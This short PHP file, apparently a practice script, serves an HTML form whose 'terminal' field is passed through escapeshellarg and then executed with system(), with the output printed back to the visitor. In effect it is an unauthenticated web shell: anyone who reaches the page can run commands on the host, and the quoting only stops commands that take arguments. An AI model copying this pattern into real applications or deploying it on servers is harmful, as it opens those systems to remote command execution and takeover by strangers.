<?php 
	
	if ($_SERVER["REQUEST_METHOD"] === 'POST') {
		$terminal = escapeshellarg($_POST["terminal"]);

		var_dump($terminal);

		echo "<pre>";

		$comando = system($terminal, $retorno);

		echo "</pre>";
	}
 ?>

 <form method="POST">
 	<input type="text" name="terminal">
 	<button type="submit">Enviar</button>
 </form>